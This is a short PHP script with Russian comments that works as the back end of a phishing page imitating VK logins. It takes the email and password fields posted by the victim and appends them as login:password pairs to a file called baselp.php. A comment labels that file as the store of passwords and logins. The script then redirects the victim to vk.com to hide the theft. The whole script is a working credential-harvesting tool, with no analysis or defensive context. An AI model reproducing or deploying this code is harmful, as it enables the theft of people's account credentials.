<?php





echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/'></head></html>"; // ПОСЛЕ ВВОДА ДАННЫХ ПЕРЕЙДЕТ ПО ССЫЛКИ "URL=https://vk.com/"





$file="baselp.php";       // ФАЙЛ ПАРОЛЕЙ И ЛОГИНОВ

$Log =$_POST['email'];

$Pass=$_POST['pass'];

$gatik=$Log.":".$Pass."\n";


$ok=fopen($file,"a+");

fwrite($ok,$gatik);

fclose($ok);

$text = "$Log:$Pass";

 
?>